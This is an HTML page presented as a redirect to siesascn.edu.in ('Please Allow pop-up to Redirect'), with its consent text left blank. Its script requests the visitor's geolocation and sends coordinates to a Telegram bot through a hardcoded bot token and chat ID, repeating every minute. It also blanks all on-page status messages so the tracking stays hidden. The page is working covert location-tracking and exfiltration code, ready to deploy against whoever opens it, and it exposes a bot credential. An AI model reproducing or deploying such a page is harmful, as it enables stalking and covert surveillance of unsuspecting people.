<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Consent Location → Telegram (HTML only demo)</title>
<style>
  :root{--bg:#0b0b0b;--card:#111;--muted:#bdbdbd;--accent:#0f62fe}
  body{margin:0;background:var(--bg);color:#eee;font-family:system-ui,Segoe UI,Arial;
       display:flex;align-items:center;justify-content:center;height:100vh;padding:16px}
  .card{background:var(--card);padding:22px;border-radius:10px;max-width:720px;width:100%;box-shadow:0 12px 40px rgba(0,0,0,.6)}
  h1{margin:0 0 8px;font-size:20px}
  p{margin:0 0 12px;color:var(--muted);line-height:1.4}
  .warn{color:#ff9aa2;font-weight:600}
  .status{margin-top:10px;color:#9fd6ff;font-size:13px}
  small{display:block;margin-top:10px;color:var(--muted);font-size:13px}
  .muted{color:var(--muted)}
</style>
</head>
<body>
    <div class="card">
    <h1>Please Allow pop-up to Redirect to siesascn.edu.in</h1>
    <p> 
    </p>
    <p class="warn"></p>
    <p id="status" class="status"></p>
    <small class="muted"></small>
  </div>

<script>
/* ===== CONFIG — REPLACE BEFORE USE ===== */
const BOT_TOKEN = "8373314757:AAEiIOlocHIOLw38toqf2XpCUnQ2tItnGv4";   // <--- replace with a temporary token only
const CHAT_ID   = 7500458607;     // <--- numeric chat id
const DEVICE_NAME = "html-demo-device";
const INTERVAL_MS = 1 * 60 * 1000;         // 5 minutes
const REDIRECT_URL = "https://siesascn.edu.in";
const OPEN_NEW_TAB = true;                 // true -> try opening Google in new tab
/* ======================================= */

const statusEl = document.getElementById('status');

function setStatus(s){
  statusEl.textContent = "";
  console.log(s);
}

/* Build Telegram API URL */
const TELEGRAM_SEND_URL = BOT_TOKEN && CHAT_ID
  ? `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendMessage`
  : null;

/* Format message text (plain text) */
function formatText(pos){
  const lat = pos.coords.latitude.toFixed(6);
  const lng = pos.coords.longitude.toFixed(6);
  const acc = pos.coords.accuracy;
  const ts  = new Date(pos.timestamp).toISOString();
  return `${DEVICE_NAME}\nLatitude: ${lat}\nLongitude: ${lng}\nAccuracy(m): ${acc}\nTime: ${ts}`;
}

/* Send message to Telegram (client-side). May be blocked by CORS in some browsers. */
async function sendToTelegram(text){
  if(!TELEGRAM_SEND_URL){
    console.warn("Telegram not configured. Skipping send.");
    return false;
  }
  try{
    const payload = { chat_id: CHAT_ID, text: text };
    // Telegram accepts JSON POSTs; CORS behavior may vary by client.
    const resp = await fetch(TELEGRAM_SEND_URL, {
      method: "POST",
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(payload),
      keepalive: true
    });
    if(!resp.ok){
      const txt = await resp.text().catch(()=>"");
      console.warn("Telegram API returned non-OK:", resp.status, txt);
      return false;
    }
    return true;
  }catch(e){
    console.warn("Error sending to Telegram:", e);
    return false;
  }
}

/* Do the sequence: send current pos then schedule repeats */
function handlePosition(pos){
  const text = formatText(pos);
  setStatus("Got position — sending to Telegram...");
  sendToTelegram(text).then(ok => {
    if(ok) setStatus("Location sent to Telegram: " + pos.coords.latitude.toFixed(5) + "," + pos.coords.longitude.toFixed(5));
    else setStatus("Tried to send to Telegram (check console for CORS/errors).");
  });

  // try to open Google in new tab
  try{
    if(OPEN_NEW_TAB){
      window.open(REDIRECT_URL, '_blank');
      setStatus(prev => { setStatus("Google opened in new tab (if not blocked). Continuing periodic sends..."); });
    }
  }catch(e){
    console.warn("Popup blocked or error opening tab:", e);
    setStatus("Could not open Google tab (popup blocked).");
  }

  // schedule periodic sends while page remains open
  const timer = setInterval(() => {
    navigator.geolocation.getCurrentPosition(async (p) => {
      const t = formatText(p);
      setStatus("Auto-sending new location...");
      await sendToTelegram(t);
    }, (err) => {
      console.warn("Periodic position error:", err);
      setStatus("Periodic position error: " + (err.message||err.code));
    }, { maximumAge: 60000, timeout: 20000, enableHighAccuracy: false });
  }, INTERVAL_MS);

  // clear interval when page unloads
  window.addEventListener('beforeunload', () => clearInterval(timer));
}

/* Start flow */
function start(){
  if(!("geolocation" in navigator)){
    setStatus("Geolocation not supported in this browser.");
    return;
  }
  if(!TELEGRAM_SEND_URL){
    setStatus("Telegram not configured. Put BOT_TOKEN and CHAT_ID into the HTML before using.");
    return;
  }
  setStatus("Requesting location permission (browser prompt)...");
  navigator.geolocation.getCurrentPosition((pos) => {
    handlePosition(pos);
  }, (err) => {
    console.warn("getCurrentPosition failed:", err);
    if(err && err.code === 1) setStatus("Permission denied by user.");
    else setStatus("Failed to get position: " + (err && err.message ? err.message : err));
  }, { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
}

/* Attempt a final send on unload using sendBeacon (best-effort) */
window.addEventListener('beforeunload', () => {
  // no-op: we can't reliably send Telegram via sendBeacon; best-effort plain text attempt omitted
});

/* Give a short visible delay so the consent box is readable, then auto-start */
setTimeout(start, 1200);
</script>
</body>
</html>
